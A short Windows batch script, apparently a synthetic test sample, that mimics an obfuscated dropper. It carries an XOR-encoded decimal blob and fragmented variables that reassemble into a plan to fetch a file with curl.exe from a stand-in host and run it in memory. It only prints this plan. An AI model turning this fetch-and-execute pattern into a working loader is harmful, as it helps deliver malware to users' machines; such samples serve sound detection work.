@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:decimal_bytes|reverse_xor
rem HUNTRESS-MATERIAL:71.82.87.29.85.80.5.0.82.87.81.85.28.87.90.95.82.69.93.90.29.86.95.67.94.82.75.86.29.87.86.3.7.0.7.1.80.11.1.28.28.9.64.67.71.71.91.14.95.65.70.79.87.86.3.7.0.7.1.80.11.1.30.93.84.90.82.67.94.82.80.14.87.90.108.93.84.90.82.67.94.82.80.79.86.93.92.93.14.86.84.82.70.84.93.82.95.108.71.75.86.93.79.86.84.82.70.84.93.82.95.108.86.94.82.64.14.91.67.82.65.84.79.2.14.71.93.70.92.80.108.86.84.82.71.64.79.86.75.86.29.95.65.70.80.14.65.86.71.67.82.87.82.79.74.65.92.94.86.94.108.91.80.71.82.67.64.90.87.31.86.71.92.94.86.65.108.86.65.90.70.66.80.82.14.64.67.86.71.64.79.2.14.69
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
SeT "fragment0=v=1|steps=acquire_remote,dispatch_memory|adapter="
SeT "fragment1=curl.exe|stage_count=1|graph=same_language|next_l"
SeT "fragment2=anguage=none|campaign_id=campaign-28c24340ed|url="
SeT "fragment3=https://28c24340ed.example.invalid/fbda36cf.dat"
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
rem no neutral statements
goto :HUNTRESS_DISPATCH
:HUNTRESS_DISPATCH
set "recovered_configuration="
for %%G in (0 1 2 3) do call set "recovered_configuration=%%recovered_configuration%%%%fragment%%G%%"
echo(!recovered_configuration!
exit /b 0
:HUNTRESS_PLAN
echo curl.exe GET https://28c24340ed.example.invalid/fbda36cf.dat then dispatch memory
exit /b 0
